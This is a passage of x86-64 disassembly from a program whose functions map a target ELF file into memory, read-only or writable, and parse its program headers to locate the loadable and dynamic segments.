  400f49:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f4d:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  400f51:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f55:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  400f59:	48 8d 90 68 42 00 00 	lea    rdx,[rax+0x4268]
  400f60:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f64:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  400f68:	b8 00 00 00 00       	mov    eax,0x0
  400f6d:	c9                   	leave  
  400f6e:	c3                   	ret    

0000000000400f6f <unload_target>:
  400f6f:	f3 0f 1e fa          	endbr64 
  400f73:	55                   	push   rbp
  400f74:	48 89 e5             	mov    rbp,rsp
  400f77:	48 83 ec 10          	sub    rsp,0x10
  400f7b:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  400f7f:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400f83:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  400f87:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400f8b:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  400f8f:	48 89 d6             	mov    rsi,rdx
  400f92:	48 89 c7             	mov    rdi,rax
  400f95:	e8 29 13 00 00       	call   4022c3 <_munmap>
  400f9a:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400f9e:	8b 80 f8 00 00 00    	mov    eax,DWORD PTR [rax+0xf8]
  400fa4:	89 c7                	mov    edi,eax
  400fa6:	e8 4c 11 00 00       	call   4020f7 <_close>
  400fab:	90                   	nop
  400fac:	c9                   	leave  
  400fad:	c3                   	ret    

0000000000400fae <load_target>:
  400fae:	f3 0f 1e fa          	endbr64 
  400fb2:	55                   	push   rbp
  400fb3:	48 89 e5             	mov    rbp,rsp
  400fb6:	53                   	push   rbx
  400fb7:	48 81 ec b8 00 00 00 	sub    rsp,0xb8
  400fbe:	48 89 bd 48 ff ff ff 	mov    QWORD PTR [rbp-0xb8],rdi
  400fc5:	48 89 b5 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rsi
  400fcc:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  400fd3:	48 8b 95 48 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xb8]
  400fda:	48 89 50 60          	mov    QWORD PTR [rax+0x60],rdx
  400fde:	48 8b 85 48 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb8]
  400fe5:	ba 00 00 00 00       	mov    edx,0x0
  400fea:	be 00 00 00 00       	mov    esi,0x0
  400fef:	48 89 c7             	mov    rdi,rax
  400ff2:	e8 ca 10 00 00       	call   4020c1 <_open>
  400ff7:	89 45 e8             	mov    DWORD PTR [rbp-0x18],eax
  400ffa:	83 7d e8 00          	cmp    DWORD PTR [rbp-0x18],0x0
  400ffe:	79 0a                	jns    40100a <load_target+0x5c>
  401000:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401005:	e9 b1 03 00 00       	jmp    4013bb <load_target+0x40d>
  40100a:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401011:	8b 55 e8             	mov    edx,DWORD PTR [rbp-0x18]
  401014:	89 90 f8 00 00 00    	mov    DWORD PTR [rax+0xf8],edx
  40101a:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  40101d:	48 98                	cdqe   
  40101f:	48 8d 95 50 ff ff ff 	lea    rdx,[rbp-0xb0]
  401026:	48 89 d6             	mov    rsi,rdx
  401029:	48 89 c7             	mov    rdi,rax
  40102c:	e8 50 11 00 00       	call   402181 <_fstat>
  401031:	85 c0                	test   eax,eax
  401033:	79 0a                	jns    40103f <load_target+0x91>
  401035:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40103a:	e9 7c 03 00 00       	jmp    4013bb <load_target+0x40d>
  40103f:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  401042:	48 63 d0             	movsxd rdx,eax
  401045:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  401049:	41 b9 00 00 00 00    	mov    r9d,0x0
  40104f:	49 89 d0             	mov    r8,rdx
  401052:	b9 02 00 00 00       	mov    ecx,0x2
  401057:	ba 03 00 00 00       	mov    edx,0x3
  40105c:	48 89 c6             	mov    rsi,rax
  40105f:	bf 00 00 00 00       	mov    edi,0x0
  401064:	e8 f4 11 00 00       	call   40225d <_mmap>
  401069:	48 8b 95 40 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xc0]
  401070:	48 89 42 50          	mov    QWORD PTR [rdx+0x50],rax
  401074:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40107b:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40107f:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  401083:	75 0a                	jne    40108f <load_target+0xe1>
  401085:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40108a:	e9 2c 03 00 00       	jmp    4013bb <load_target+0x40d>
  40108f:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401096:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40109a:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010a1:	48 89 10             	mov    QWORD PTR [rax],rdx
  4010a4:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010ab:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4010af:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010b6:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4010b9:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  4010bd:	48 01 c2             	add    rdx,rax
  4010c0:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010c7:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  4010cb:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010d2:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4010d6:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010dd:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4010e0:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  4010e4:	48 01 c2             	add    rdx,rax
  4010e7:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010ee:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  4010f2:	c7 45 ec 00 00 00 00 	mov    DWORD PTR [rbp-0x14],0x0
  4010f9:	e9 b6 01 00 00       	jmp    4012b4 <load_target+0x306>
  4010fe:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401105:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401109:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40110c:	48 63 d0             	movsxd rdx,eax
  40110f:	48 89 d0             	mov    rax,rdx
  401112:	48 c1 e0 03          	shl    rax,0x3
  401116:	48 29 d0             	sub    rax,rdx
  401119:	48 c1 e0 03          	shl    rax,0x3
  40111d:	48 01 c8             	add    rax,rcx
  401120:	8b 00                	mov    eax,DWORD PTR [rax]
  401122:	83 f8 01             	cmp    eax,0x1
  401125:	74 0e                	je     401135 <load_target+0x187>
  401127:	83 f8 02             	cmp    eax,0x2
  40112a:	0f 84 3f 01 00 00    	je     40126f <load_target+0x2c1>
  401130:	e9 7b 01 00 00       	jmp    4012b0 <load_target+0x302>
  401135:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40113c:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401140:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401143:	48 63 d0             	movsxd rdx,eax
  401146:	48 89 d0             	mov    rax,rdx
  401149:	48 c1 e0 03          	shl    rax,0x3
  40114d:	48 29 d0             	sub    rax,rdx
  401150:	48 c1 e0 03          	shl    rax,0x3
  401154:	48 01 c8             	add    rax,rcx
  401157:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  40115b:	48 85 c0             	test   rax,rax
  40115e:	0f 95 c0             	setne  al
  401161:	0f b6 c0             	movzx  eax,al
  401164:	85 c0                	test   eax,eax
  401166:	74 0a                	je     401172 <load_target+0x1c4>
  401168:	83 f8 01             	cmp    eax,0x1
  40116b:	74 6c                	je     4011d9 <load_target+0x22b>
  40116d:	e9 3e 01 00 00       	jmp    4012b0 <load_target+0x302>
  401172:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401179:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40117d:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401180:	48 63 d0             	movsxd rdx,eax
  401183:	48 89 d0             	mov    rax,rdx
  401186:	48 c1 e0 03          	shl    rax,0x3
  40118a:	48 29 d0             	sub    rax,rdx
  40118d:	48 c1 e0 03          	shl    rax,0x3
  401191:	48 01 c8             	add    rax,rcx
  401194:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  401198:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40119f:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  4011a3:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4011aa:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4011ae:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4011b1:	48 63 d0             	movsxd rdx,eax
  4011b4:	48 89 d0             	mov    rax,rdx
  4011b7:	48 c1 e0 03          	shl    rax,0x3
  4011bb:	48 29 d0             	sub    rax,rdx
  4011be:	48 c1 e0 03          	shl    rax,0x3
  4011c2:	48 01 c8             	add    rax,rcx
  4011c5:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  4011c9:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4011d0:	48 89 50 30          	mov    QWORD PTR [rax+0x30],rdx
  4011d4:	e9 94 00 00 00       	jmp    40126d <load_target+0x2bf>
  4011d9:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4011e0:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4011e4:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4011e7:	48 63 d0             	movsxd rdx,eax
  4011ea:	48 89 d0             	mov    rax,rdx
  4011ed:	48 c1 e0 03          	shl    rax,0x3
  4011f1:	48 29 d0             	sub    rax,rdx
  4011f4:	48 c1 e0 03          	shl    rax,0x3
  4011f8:	48 01 c8             	add    rax,rcx
  4011fb:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  4011ff:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401206:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  40120a:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401211:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401215:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401218:	48 63 d0             	movsxd rdx,eax
  40121b:	48 89 d0             	mov    rax,rdx
  40121e:	48 c1 e0 03          	shl    rax,0x3
  401222:	48 29 d0             	sub    rax,rdx
  401225:	48 c1 e0 03          	shl    rax,0x3
  401229:	48 01 c8             	add    rax,rcx
  40122c:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  401230:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401237:	48 89 50 38          	mov    QWORD PTR [rax+0x38],rdx
  40123b:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401242:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401246:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401249:	48 63 d0             	movsxd rdx,eax
  40124c:	48 89 d0             	mov    rax,rdx
  40124f:	48 c1 e0 03          	shl    rax,0x3
  401253:	48 29 d0             	sub    rax,rdx
  401256:	48 c1 e0 03          	shl    rax,0x3
  40125a:	48 01 c8             	add    rax,rcx
  40125d:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  401261:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401268:	48 89 50 40          	mov    QWORD PTR [rax+0x40],rdx
  40126c:	90                   	nop
  40126d:	eb 41                	jmp    4012b0 <load_target+0x302>
  40126f:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401276:	48 8b 48 50          	mov    rcx,QWORD PTR [rax+0x50]
  40127a:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401281:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  401285:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401288:	48 63 d0             	movsxd rdx,eax
  40128b:	48 89 d0             	mov    rax,rdx
  40128e:	48 c1 e0 03          	shl    rax,0x3
  401292:	48 29 d0             	sub    rax,rdx
  401295:	48 c1 e0 03          	shl    rax,0x3
  401299:	48 01 f0             	add    rax,rsi
  40129c:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  4012a0:	48 8d 14 01          	lea    rdx,[rcx+rax*1]
  4012a4:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4012ab:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  4012af:	90                   	nop
  4012b0:	83 45 ec 01          	add    DWORD PTR [rbp-0x14],0x1
  4012b4:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4012bb:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4012be:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  4012c2:	0f b7 c0             	movzx  eax,ax
  4012c5:	39 45 ec             	cmp    DWORD PTR [rbp-0x14],eax
  4012c8:	0f 8c 30 fe ff ff    	jl     4010fe <load_target+0x150>
  4012ce:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4012d5:	48 8b 8d 50 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xb0]
  4012dc:	48 8b 9d 58 ff ff ff 	mov    rbx,QWORD PTR [rbp-0xa8]
  4012e3:	48 89 48 68          	mov    QWORD PTR [rax+0x68],rcx
  4012e7:	48 89 58 70          	mov    QWORD PTR [rax+0x70],rbx
  4012eb:	48 8b 8d 60 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xa0]
  4012f2:	48 8b 9d 68 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x98]
  4012f9:	48 89 48 78          	mov    QWORD PTR [rax+0x78],rcx
  4012fd:	48 89 98 80 00 00 00 	mov    QWORD PTR [rax+0x80],rbx
  401304:	48 8b 8d 70 ff ff ff 	mov    rcx,QWORD PTR [rbp-0x90]
  40130b:	48 8b 9d 78 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x88]
  401312:	48 89 88 88 00 00 00 	mov    QWORD PTR [rax+0x88],rcx
  401319:	48 89 98 90 00 00 00 	mov    QWORD PTR [rax+0x90],rbx
  401320:	48 8b 4d 80          	mov    rcx,QWORD PTR [rbp-0x80]
  401324:	48 8b 5d 88          	mov    rbx,QWORD PTR [rbp-0x78]
  401328:	48 89 88 98 00 00 00 	mov    QWORD PTR [rax+0x98],rcx
  40132f:	48 89 98 a0 00 00 00 	mov    QWORD PTR [rax+0xa0],rbx
  401336:	48 8b 4d 90          	mov    rcx,QWORD PTR [rbp-0x70]
  40133a:	48 8b 5d 98          	mov    rbx,QWORD PTR [rbp-0x68]
  40133e:	48 89 88 a8 00 00 00 	mov    QWORD PTR [rax+0xa8],rcx
  401345:	48 89 98 b0 00 00 00 	mov    QWORD PTR [rax+0xb0],rbx
  40134c:	48 8b 4d a0          	mov    rcx,QWORD PTR [rbp-0x60]
  401350:	48 8b 5d a8          	mov    rbx,QWORD PTR [rbp-0x58]
  401354:	48 89 88 b8 00 00 00 	mov    QWORD PTR [rax+0xb8],rcx
  40135b:	48 89 98 c0 00 00 00 	mov    QWORD PTR [rax+0xc0],rbx
  401362:	48 8b 4d b0          	mov    rcx,QWORD PTR [rbp-0x50]
  401366:	48 8b 5d b8          	mov    rbx,QWORD PTR [rbp-0x48]
  40136a:	48 89 88 c8 00 00 00 	mov    QWORD PTR [rax+0xc8],rcx
  401371:	48 89 98 d0 00 00 00 	mov    QWORD PTR [rax+0xd0],rbx
  401378:	48 8b 4d c0          	mov    rcx,QWORD PTR [rbp-0x40]
  40137c:	48 8b 5d c8          	mov    rbx,QWORD PTR [rbp-0x38]
  401380:	48 89 88 d8 00 00 00 	mov    QWORD PTR [rax+0xd8],rcx
  401387:	48 89 98 e0 00 00 00 	mov    QWORD PTR [rax+0xe0],rbx
  40138e:	48 8b 4d d0          	mov    rcx,QWORD PTR [rbp-0x30]
  401392:	48 8b 5d d8          	mov    rbx,QWORD PTR [rbp-0x28]
  401396:	48 89 88 e8 00 00 00 	mov    QWORD PTR [rax+0xe8],rcx
  40139d:	48 89 98 f0 00 00 00 	mov    QWORD PTR [rax+0xf0],rbx
  4013a4:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  4013a8:	48 89 c2             	mov    rdx,rax
  4013ab:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4013b2:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  4013b6:	b8 00 00 00 00       	mov    eax,0x0
  4013bb:	48 81 c4 b8 00 00 00 	add    rsp,0xb8
  4013c2:	5b                   	pop    rbx
  4013c3:	5d                   	pop    rbp
  4013c4:	c3                   	ret    

00000000004013c5 <load_target_writeable>:
  4013c5:	f3 0f 1e fa          	endbr64 
  4013c9:	55                   	push   rbp
  4013ca:	48 89 e5             	mov    rbp,rsp
  4013cd:	53                   	push   rbx
  4013ce:	48 81 ec b8 00 00 00 	sub    rsp,0xb8
  4013d5:	48 89 bd 48 ff ff ff 	mov    QWORD PTR [rbp-0xb8],rdi
  4013dc:	48 89 b5 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rsi
  4013e3:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4013ea:	48 8b 95 48 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xb8]
  4013f1:	48 89 50 60          	mov    QWORD PTR [rax+0x60],rdx
  4013f5:	48 8b 85 48 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb8]
  4013fc:	ba 00 00 00 00       	mov    edx,0x0
  401401:	be 02 00 00 00       	mov    esi,0x2
  401406:	48 89 c7             	mov    rdi,rax
  401409:	e8 b3 0c 00 00       	call   4020c1 <_open>
  40140e:	89 45 e8             	mov    DWORD PTR [rbp-0x18],eax
  401411:	83 7d e8 00          	cmp    DWORD PTR [rbp-0x18],0x0
  401415:	79 0a                	jns    401421 <load_target_writeable+0x5c>
  401417:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40141c:	e9 b1 03 00 00       	jmp    4017d2 <load_target_writeable+0x40d>
  401421:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401428:	8b 55 e8             	mov    edx,DWORD PTR [rbp-0x18]
  40142b:	89 90 f8 00 00 00    	mov    DWORD PTR [rax+0xf8],edx
  401431:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  401434:	48 98                	cdqe   
  401436:	48 8d 95 50 ff ff ff 	lea    rdx,[rbp-0xb0]
  40143d:	48 89 d6             	mov    rsi,rdx
  401440:	48 89 c7             	mov    rdi,rax
  401443:	e8 39 0d 00 00       	call   402181 <_fstat>
  401448:	85 c0                	test   eax,eax
  40144a:	79 0a                	jns    401456 <load_target_writeable+0x91>
  40144c:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401451:	e9 7c 03 00 00       	jmp    4017d2 <load_target_writeable+0x40d>
  401456:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  401459:	48 63 d0             	movsxd rdx,eax
  40145c:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  401460:	41 b9 00 00 00 00    	mov    r9d,0x0
  401466:	49 89 d0             	mov    r8,rdx
  401469:	b9 01 00 00 00       	mov    ecx,0x1
  40146e:	ba 03 00 00 00       	mov    edx,0x3
  401473:	48 89 c6             	mov    rsi,rax
  401476:	bf 00 00 00 00       	mov    edi,0x0
  40147b:	e8 dd 0d 00 00       	call   40225d <_mmap>
  401480:	48 8b 95 40 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xc0]
  401487:	48 89 42 50          	mov    QWORD PTR [rdx+0x50],rax
  40148b:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401492:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  401496:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  40149a:	75 0a                	jne    4014a6 <load_target_writeable+0xe1>
  40149c:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4014a1:	e9 2c 03 00 00       	jmp    4017d2 <load_target_writeable+0x40d>
  4014a6:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014ad:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4014b1:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014b8:	48 89 10             	mov    QWORD PTR [rax],rdx
  4014bb:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014c2:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4014c6:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014cd:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4014d0:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  4014d4:	48 01 c2             	add    rdx,rax
  4014d7:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014de:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  4014e2:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014e9:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4014ed:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014f4:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4014f7:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  4014fb:	48 01 c2             	add    rdx,rax
  4014fe:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401505:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  401509:	c7 45 ec 00 00 00 00 	mov    DWORD PTR [rbp-0x14],0x0
  401510:	e9 b6 01 00 00       	jmp    4016cb <load_target_writeable+0x306>
  401515:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40151c:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401520:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401523:	48 63 d0             	movsxd rdx,eax
  401526:	48 89 d0             	mov    rax,rdx
  401529:	48 c1 e0 03          	shl    rax,0x3
  40152d:	48 29 d0             	sub    rax,rdx
  401530:	48 c1 e0 03          	shl    rax,0x3
  401534:	48 01 c8             	add    rax,rcx
  401537:	8b 00                	mov    eax,DWORD PTR [rax]
  401539:	83 f8 01             	cmp    eax,0x1
  40153c:	74 0e                	je     40154c <load_target_writeable+0x187>
  40153e:	83 f8 02             	cmp    eax,0x2
  401541:	0f 84 3f 01 00 00    	je     401686 <load_target_writeable+0x2c1>
  401547:	e9 7b 01 00 00       	jmp    4016c7 <load_target_writeable+0x302>
  40154c:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401553:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401557:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40155a:	48 63 d0             	movsxd rdx,eax
  40155d:	48 89 d0             	mov    rax,rdx
  401560:	48 c1 e0 03          	shl    rax,0x3
  401564:	48 29 d0             	sub    rax,rdx
  401567:	48 c1 e0 03          	shl    rax,0x3
  40156b:	48 01 c8             	add    rax,rcx
  40156e:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401572:	48 85 c0             	test   rax,rax
  401575:	0f 95 c0             	setne  al
  401578:	0f b6 c0             	movzx  eax,al
  40157b:	85 c0                	test   eax,eax
  40157d:	74 0a                	je     401589 <load_target_writeable+0x1c4>
  40157f:	83 f8 01             	cmp    eax,0x1
  401582:	74 6c                	je     4015f0 <load_target_writeable+0x22b>
  401584:	e9 3e 01 00 00       	jmp    4016c7 <load_target_writeable+0x302>
  401589:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401590:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401594:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401597:	48 63 d0             	movsxd rdx,eax
  40159a:	48 89 d0             	mov    rax,rdx
  40159d:	48 c1 e0 03          	shl    rax,0x3
  4015a1:	48 29 d0             	sub    rax,rdx
  4015a4:	48 c1 e0 03          	shl    rax,0x3
  4015a8:	48 01 c8             	add    rax,rcx
  4015ab:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  4015af:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015b6:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  4015ba:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015c1:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4015c5:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4015c8:	48 63 d0             	movsxd rdx,eax
  4015cb:	48 89 d0             	mov    rax,rdx
  4015ce:	48 c1 e0 03          	shl    rax,0x3
  4015d2:	48 29 d0             	sub    rax,rdx
  4015d5:	48 c1 e0 03          	shl    rax,0x3
  4015d9:	48 01 c8             	add    rax,rcx
  4015dc:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  4015e0:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015e7:	48 89 50 30          	mov    QWORD PTR [rax+0x30],rdx
  4015eb:	e9 94 00 00 00       	jmp    401684 <load_target_writeable+0x2bf>
  4015f0:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015f7:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4015fb:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4015fe:	48 63 d0             	movsxd rdx,eax
  401601:	48 89 d0             	mov    rax,rdx
  401604:	48 c1 e0 03          	shl    rax,0x3
  401608:	48 29 d0             	sub    rax,rdx
  40160b:	48 c1 e0 03          	shl    rax,0x3
  40160f:	48 01 c8             	add    rax,rcx
  401612:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  401616:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40161d:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  401621:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401628:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40162c:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40162f:	48 63 d0             	movsxd rdx,eax
  401632:	48 89 d0             	mov    rax,rdx
  401635:	48 c1 e0 03          	shl    rax,0x3
  401639:	48 29 d0             	sub    rax,rdx
  40163c:	48 c1 e0 03          	shl    rax,0x3
  401640:	48 01 c8             	add    rax,rcx
  401643:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  401647:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40164e:	48 89 50 38          	mov    QWORD PTR [rax+0x38],rdx
  401652:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401659:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40165d:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401660:	48 63 d0             	movsxd rdx,eax
  401663:	48 89 d0             	mov    rax,rdx
  401666:	48 c1 e0 03          	shl    rax,0x3
  40166a:	48 29 d0             	sub    rax,rdx
  40166d:	48 c1 e0 03          	shl    rax,0x3
  401671:	48 01 c8             	add    rax,rcx
  401674:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  401678:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40167f:	48 89 50 40          	mov    QWORD PTR [rax+0x40],rdx
  401683:	90                   	nop
  401684:	eb 41                	jmp    4016c7 <load_target_writeable+0x302>
  401686:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40168d:	48 8b 48 50          	mov    rcx,QWORD PTR [rax+0x50]
  401691:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
